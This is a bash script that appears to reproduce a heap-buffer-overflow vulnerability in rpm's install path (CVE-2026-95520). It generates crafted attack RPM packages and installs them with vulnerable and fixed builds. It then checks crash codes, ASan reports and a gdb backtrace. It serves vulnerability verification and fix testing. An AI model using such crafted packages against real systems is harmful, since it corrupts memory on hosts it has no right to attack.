#!/usr/bin/env bash
# Replay the real rpm -i (fsm) consumer evidence for CVE-2026-95520.
# The vulnerable symlink size wraps xmalloc(lsize+1) to one byte; the crafted
# cpio payload writes chosen bytes past it.  Unlike rpm2cpio, the plain
# install consumer faults naturally at process teardown, and the chosen
# payload byte value decides whether it faults.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
vuln_config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$vuln_config/rpmrc" ] || vuln_config=$root/build-vuln-asan
# Normalize the config path length for the plain install fault the same way
# as run-gc-pointer.sh: the natural liblua adjacency is layout-sensitive
# to this string. Package bytes, binary and allocation site are unchanged.
cfg_link=$(mktemp -d /tmp/r2s-cfg.XXXXX) || exit 1
rmdir "$cfg_link" || exit 1
ln -s "$vuln_config" "$cfg_link" || exit 1
vuln_config=$cfg_link
work=$PWD/install
mkdir -p "$work"

# The relocated fixture installs four files under /tmp.  Refuse to run if
# those names are already occupied and remove only those names afterwards.
targets=(/tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh)
for p in "${targets[@]}"; do
    if [ -e "$p" ]; then
        echo "REFUSE: $p already exists; not overwriting an unrelated file"
        exit 1
    fi
done
cleanup() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
trap 'cleanup; rm -f "$cfg_link"' EXIT
fresh() {
    cleanup
    rm -rf "$work/db"
    mkdir -p "$work/db"
}

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }
expect_rc() {
    # name expected config binary fixture asan(0|1)
    local name=$1 want=$2 cfg=$3 bin=$4 fixture=$5 asan=$6
    fresh
    local -a envargs=(RPM_CONFIGDIR="$cfg")
    if [ "$asan" -eq 1 ]; then
        envargs+=(ASAN_OPTIONS=detect_leaks=0:abort_on_error=1)
    fi
    env "${envargs[@]}" "$bin" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$work/$fixture" > "$work/$name.log" 2>&1
    local rc=$?
    printf '%s\n' "$rc" > "$work/$name.log.rc"
    if [ "$rc" -eq "$want" ]; then
        ok "$name rc=$rc"
    else
        bad "$name rc=$rc want=$want"
    fi
}

python3 make-attack.py safe.rpm attack.rpm safe-newc.rpm > make-attack.log || exit 1
python3 relocate-install.py > install/generate.log || cat install/generate.log

vuln_asan=$root/build-vuln-asan/tools/rpm
fixed_asan=$root/build-fixed-asan/tools/rpm
vuln_plain=$root/build-vuln-plain/tools/rpm
for bin in "$vuln_asan" "$fixed_asan" "$vuln_plain"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done

expect_rc asan-vuln-attack 134 "$vuln_config" "$vuln_asan" attack-reloc.rpm 1
expect_rc asan-fixed-attack 1 "$fixed_config" "$fixed_asan" attack-reloc.rpm 1
for i in 1 2 3; do
    expect_rc plain-vuln-attack-$i 139 "$vuln_config" "$vuln_plain" attack-reloc.rpm 0
done
for i in 1 2; do
    expect_rc plain-vuln-zero-$i 1 "$vuln_config" "$vuln_plain" attack-zero-reloc.rpm 0
    expect_rc plain-vuln-short-$i 1 "$vuln_config" "$vuln_plain" short-read-reloc.rpm 0
done
expect_rc plain-vuln-safe 1 "$vuln_config" "$vuln_plain" safe-reloc.rpm 0

if grep -q 'AddressSanitizer: heap-buffer-overflow' install/asan-vuln-attack.log && \
   grep -q 'WRITE of size 64' install/asan-vuln-attack.log && \
   grep -q 'iterReadArchiveNext' install/asan-vuln-attack.log && \
   grep -q 'rpmfi.cc:2242' install/asan-vuln-attack.log; then
    ok "asan-vuln-attack report: WRITE size 64 in iterReadArchiveNext at rpmfi.cc:2242"
else
    bad "asan-vuln-attack report missing expected ASan frames"
fi
if ! grep -q AddressSanitizer install/asan-fixed-attack.log; then
    ok "asan-fixed-attack ASan-clean"
else
    bad "asan-fixed-attack has an ASan report"
fi
if ! grep -q AddressSanitizer install/plain-vuln-attack-1.log; then
    ok "plain-vuln-attack log has no ASan report"
else
    bad "plain build unexpectedly has an ASan report"
fi

# One plain GDB run records where the natural fault occurs.  The plain build
# has no source-level breakpoints, but shared-library frame names resolve.
fresh
RPM_CONFIGDIR="$vuln_config" gdb -q -batch -ex 'set pagination off' \
    -ex run -ex 'bt 8' \
    --args "$vuln_plain" --dbpath "$work/db" -i \
    --nodeps --noscripts --nodigest --nosignature --nofiledigest \
    --ignoresize "$work/attack-reloc.rpm" > install/gdb-plain-attack.log 2>&1
if grep -q 'SIGSEGV' install/gdb-plain-attack.log && \
   grep -q rpmluaFree install/gdb-plain-attack.log && \
   grep -q liblua5.2 install/gdb-plain-attack.log; then
    ok "plain fault backtrace: rpmluaFree in liblua5.2"
else
    bad "plain fault backtrace missing rpmluaFree/liblua5.2"
fi

echo "INSTALL_CONSUMER_PASS=$pass INSTALL_CONSUMER_FAIL=$fail"
[ "$fail" -eq 0 ]
